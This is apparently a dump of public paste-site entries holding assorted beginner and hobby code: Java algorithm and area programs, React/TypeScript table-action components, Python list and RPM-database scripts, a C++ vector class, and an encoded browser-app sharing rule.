        }

        return left;
    }

    static int[] nearestSmallerOnRight(int[] a, int n) {
        int[] right = new int[n];
        Stack<Integer> stack = new Stack<>();

        for (int i = n - 1; i >= 0; i--) {
            while (!stack.isEmpty() && a[i] <= a[stack.peek()]) {
                stack.pop();
            }
            right[i] = stack.isEmpty() ? -1 : stack.peek();
            stack.push(i);
        }

        return right;
    }

    static int areahistogram(int a[], int n) {
        int[] r = nearestSmallerOnRight(a, n);
        int[] l = nearestSmallerOnLeft(a, n);

        int ans = 0;
        for (int i = 0; i < n; i++) {
            ans = Math.max(ans, (r[i] - l[i] - 1) * a[i]);
        }

        return ans;
    }

    public static void main(String[] args) {
        Scanner s = new Scanner(System.in);
        int t = s.nextInt();

        while (t-- > 0) {
            int n = s.nextInt();
            int a[] = new int[n];

            for (int i = 0; i < n; i++) {
                a[i] = s.nextInt();
            }

            System.out.println(areahistogram(a, n));
        }
    }
}
"
D9ujazVq,src/app/packages/columns.tsx,TIMAS_Bro,TypeScript,Tuesday 12th of March 2024 07:08:44 AM CDT,"""use client""

import { ColumnDef } from ""@tanstack/react-table""
import { MoreHorizontal } from ""lucide-react""
import axios from ""axios"";
import { AxiosError } from 'axios'; // Import AxiosError type
import { Button } from ""@/components/ui/button""
import SnackbarContent from '@mui/material/SnackbarContent';
import React, { useState } from 'react';
import { useRouter } from ""next/navigation"";
import toast, { Toaster } from 'react-hot-toast';
import Action from ""../../hooks/ActionAllPackages"";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from ""@/components/ui/dropdown-menu""

// This type is used to define the shape of our data.
// You can use a Zod schema here if you want.
export type Payment = {
  id: string
  name: string
}


export const columns: ColumnDef<Payment>[] = [
  {
    accessorKey: ""id"",
    header: ""Package ID"",
  },
  {
    accessorKey: ""name"",
    header: ""Package name"",
  },
  {
    id: ""actions"",
    header: ""Actions"",
    cell: ({ row }) => {
      const paket = row.original
      return (
        <Action paket={paket} />
      )
    },
  },
]
"
ZiTBpUhg,src/hooks/ActionAllPackages.tsx,TIMAS_Bro,TypeScript,Tuesday 12th of March 2024 07:08:13 AM CDT,"


import { ColumnDef } from ""@tanstack/react-table""
import { MoreHorizontal } from ""lucide-react""
import axios from ""axios"";
import { AxiosError } from 'axios'; // Import AxiosError type
import { Button } from ""@/components/ui/button""
import Snackbar from '@mui/material/Snackbar';
import Alert from '@mui/material/Alert';
import SnackbarContent from '@mui/material/SnackbarContent';
import React, { useState } from 'react';
import { useRouter } from ""next/navigation"";
import toast, { Toaster } from 'react-hot-toast';
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from ""@/components/ui/dropdown-menu""

const ActionAllPackages = (paket) => {
  const router = useRouter();
  const handleCloseSnackbar = () => {
  const handleCopyPackagaName = (dependency) => {
    navigator.clipboard.writeText(dependency)
      .then(() => {
        toast.success(""Copied package name!"")
      })
      .catch(error => {
        toast.error(""Failed to copy the package name..."")
      });
  }

  const copyLink = () => {
    const selectedPackage = paket;

    // Return a new Promise
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        navigator.clipboard.writeText(paket.link)
          .then(() => {
            // Resolve the promise if copying is successful
            resolve(paket.link);
          })
          .catch(error => {
            // Reject the promise if copying fails
            console.log(""COPY-ERROR: "", error);
            reject(error);
          });
      }, 1000);

    });
  };
  const handleCopyInstallLink = (e) => {
      const copyPromise = copyLink();
      toast.promise(
        copyPromise,
       {
         loading: 'Copying...',
         success: <b>Copied the install link!</b>,
         error: <b>Could not copy the install link!</b>,
       }
     );
  };
  const handleDetailedView = () => {
    router.push(`/detailed_view?name=${paket.name}`);
  };
  return (
    <div>
    <Toaster position=""bottom-right"" reverseOrder={false} />
    <DropdownMenu>
      <DropdownMenuTrigger asChild>
        <Button variant=""ghost"" className=""h-8 w-8 p-0"">
          <span className=""sr-only"">Open menu</span>
          <MoreHorizontal className=""h-4 w-4"" />
        </Button>
      </DropdownMenuTrigger>
      <DropdownMenuContent align=""end"">
        <DropdownMenuLabel>Actions</DropdownMenuLabel>
        <DropdownMenuItem
          onClick={() => handleCopyPackagaName(paket.name)}
        >
          Copy package name
        </DropdownMenuItem>
        <DropdownMenuItem
          onClick={handleCopyInstallLink}
        >
          Copy install link
        </DropdownMenuItem>
        <DropdownMenuSeparator />
        <DropdownMenuItem
          onClick={handleDetailedView}
        >
          Detailed view
        </DropdownMenuItem>
      </DropdownMenuContent>
    </DropdownMenu>
    </div>
  )
}

export default ActionAllPackages;
"
eK9fS9Tc,Untitled,paganoantonio,Java,Tuesday 12th of March 2024 06:34:09 AM CDT,"
import java.util.Scanner;

public class Test {

	public static void main(String[] args) {
			Scanner s = new Scanner(System.in);
			System.out.println(""inserisci 0 per calcolare l'area del triangolo"");
			System.out.println(""inserisci 1 per calcolare l'area di un quadrato"");	
			int r = s.nextInt();
			if (r == 0)
			{// area triangolo
				System.out.println(""inserisci la base"");
				int b = s.nextInt();
				System.out.println(""inserisci l'altezza"");
				int h = s.nextInt();
				int area = b*h/2;
				System.out.println(""l'area è:""+area);
			}
			if (r == 1)
			{// area quadrato
				System.out.println(""inserisci il lato"");
				int l = s.nextInt();
				int area = l*l;
				System.out.println(""l'area è:""+area);
			}
	}
}"
6z15gdUW,Review WesternFX,reviewbrokers,PHP,Tuesday 12th of March 2024 06:27:46 AM CDT,https://www.reviewbrokers.net/review-westernfx/
tB0z3prg,23401,boyan1324,Python,Tuesday 12th of March 2024 06:23:48 AM CDT,"my_list = [74, 154, 74, 90, 946, 995, 745, 549, 649, 522, 397, 129, 741, 299, 230]
middle_of_list = len(my_list) // 2
print(my_list)
my_list_copy = my_list.copy()
my_list_copy.reverse()
my_list.extend(my_list)
print(my_list)
print(sorted(my_list))
my_list.append(max(my_list))
my_list.sort(reverse=True)
print(my_list)
my_list.insert(middle_of_list, sum(my_list))
print(my_list)
my_list.insert(0, min(my_list))
print(my_list)
for i in my_list:
    if i % 10 == 8:
        my_list.remove(i)
        break
print(my_list)
my_list.insert(0, max(my_list))
print(my_list)
for j in my_list:
    if j % 10 == 7:
        my_list.insert(3, j)
        break
print(my_list)
"
GzAcUj05,Untitled,buonaseva_fatelo,Python,Tuesday 12th of March 2024 06:19:59 AM CDT,"'''#
# for sqlite databases
#

import json
import rpm
import tarfile

dbpath = ""/home/ubuntu-wbox-internal/Desktop/activity8/almalinux_db/var/lib/rpm""
#dbtype =   ""sqlite""
print(""ok"")


# database extraction
#tarfile = tarfile.open(""almalinux.tar"")
#tarfile.extractall(dbpath)
#tarfile.close()


#rpm.addMacro(""_db_backend"", dbtype)
rpm.addMacro(""_dbpath"", dbpath)
print(""ok"")

ts = rpm.TransactionSet()
ts.openDB()

#rpm.delMacro(""_db_backend"")
rpm.delMacro(""_dbpath"")

allPackages = []
mi = ts.dbMatch()
#mi.pattern(""name"", rpm.RPMMIRE_GLOB, ""kernel*"")
print(f""mi = {mi}"")

for hdr in mi:
    # second method
    pkg = {}
    pkg['name'] = hdr[rpm.RPMTAG_NAME]
    pkg['version'] = str(hdr[rpm.RPMTAG_VERSION])
    pkg['size'] = str(hdr[rpm.RPMTAG_SIZE])
    pkg['license'] = hdr[rpm.RPMTAG_LICENSE]
    pkg['arch'] = hdr[rpm.RPMTAG_ARCH]
    pkg['group'] = hdr[rpm.RPMTAG_GROUP]
    pkg['provides'] = hdr[rpm.RPMTAG_PROVIDES]
    pkg['dependencies'] = hdr[rpm.RPMTAG_REQUIRES]

    allPackages.append(pkg)

with open(""out_rpm.json"", ""w"") as fileout:
    print(json.dump(allPackages, fileout))

# ts.closeDB()
'''

#
# for sqlite databases
#

import json
import rpm
import tarfile

dbpath = ""/home/ubuntu-wbox-internal/Desktop/activity8/var/lib/rpm""
dbtype = ""ndb""
print(""ok"")

# database extraction
# tarfile = tarfile.open(""almalinux.tar"")
# tarfile.extractall(dbpath)
# tarfile.close()


rpm.addMacro(""_db_backend"", dbtype)
rpm.addMacro(""_dbpath"", dbpath)
print(""ok"")

ts = rpm.TransactionSet()
ts.openDB()

rpm.delMacro(""_db_backend"")
rpm.delMacro(""_dbpath"")

allPackages = []
mi = ts.dbMatch()
# mi.pattern(""name"", rpm.RPMMIRE_GLOB, ""kernel*"")
print(f""mi = {mi}"")

for hdr in mi:
    # second method
    pkg = {}
    pkg['name'] = hdr[rpm.RPMTAG_NAME]
    pkg['version'] = str(hdr[rpm.RPMTAG_VERSION])
    pkg['size'] = str(hdr[rpm.RPMTAG_SIZE])
    pkg['license'] = hdr[rpm.RPMTAG_LICENSE]
    pkg['arch'] = hdr[rpm.RPMTAG_ARCH]
    pkg['group'] = hdr[rpm.RPMTAG_GROUP]
    pkg['provides'] = hdr[rpm.RPMTAG_PROVIDES]
    pkg['dependencies'] = hdr[rpm.RPMTAG_REQUIRES]

    allPackages.append(pkg)

with open(""out_rpm.json"", ""w"") as fileout:
    print(json.dump(allPackages, fileout))

# ts.closeD"
aTX7aLcf,Untitled,35657,C++,Tuesday 12th of March 2024 06:19:29 AM CDT,"
#include <iostream>
#include <string>

using namespace std;

template<typename T>
class SimpleVector {

public:

	SimpleVector() : arr_(new T[10]), size_(10) {}

	SimpleVector(int size) : arr_(new T[size]), size_(size) {}

	SimpleVector(const SimpleVector& object) : arr_(new T[object.size_] {}), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new T[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}
		return *this;
	}

	T& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	T operator[] (int index) const {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	int Size() const {
		return size_;
	}

	~SimpleVector() {
		delete[] arr_;
	}

private:
	T* arr_;
	int size_;
};

template<typename T>
void print(const SimpleVector<T>& vec) {
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << "" "";
	}
	cout << endl;
}

template<typename T>
void sort(SimpleVector<T>& vec) {
	for (int i = 0; i < vec.Size(); i++) {
		for (int j = 0; j < vec.Size() - 1; j++) {
			if (vec[j] > vec[j + 1]) {
				T temp = vec[j];
				vec[j] = vec[j + 1];
				vec[j + 1] = temp;
			}
		}
	}
}

int main() {
	SimpleVector<int> vec;
	for (int i = 0; i < vec.Size(); i++) {
		vec[i] = rand() % 10;
	}
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << "" "";
	}
	cout << endl;

	SimpleVector<int> IntVector;
	for (int i = 0; i < IntVector.Size(); i++) {
		IntVector[i] = rand() % 10;
	}
	cout << ""IntVector:"" << endl;
	print(IntVector);
	cout << endl;
	cout << ""Sorted IntVector:"" << endl;
	sort(IntVector);
	print(IntVector);
	cout << endl;

	SimpleVector<string> StringVector;
	StringVector[0] = ""two"";
	StringVector[1] = ""seven"";
	StringVector[2] = ""zero"";
	StringVector[3] = ""four"";
	StringVector[4] = ""one"";
	StringVector[5] = ""three"";
	StringVector[6] = ""five"";
	StringVector[7] = ""six"";
	StringVector[8] = ""eight"";
	StringVector[9] = ""nine"";
	cout << ""StringVector:"" << endl;
	print(StringVector);
	cout << endl;
	cout << ""Sorted StringVector:"" << endl;
	sort(StringVector);
	print(StringVector);
	cout << endl;
}"
wcYGjNCH,邀您一起看：2024年2月推荐,xiaomianao666,JavaScript,Tuesday 12th of March 2024 06:13:38 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥2024年2月推荐@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5aWH5aaZ5bel5YW3566xXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImh0dHBzOi8vaGFpa3Vvc2hpamllLmNuL2FyY2hpdmVzLzIwMjRuaWFuLTJ5dWUtdHVpLWppYW5cXFwiLFxcbmRlc2M6XFxcIjEwMCUmJmZsb2F0XFxcIixcXG5leHRyYTp7Y2FuQmFjazogdHJ1ZX1cXG59XSk7XCIsXCJncm91cFwiOlwi4pGg5o6o6I2QXCIsXCJwYWdlc1wiOlwiW11cIn0iLCJ0aXRsZSI6IjIwMjTlubQy5pyI5o6o6I2QIn0=
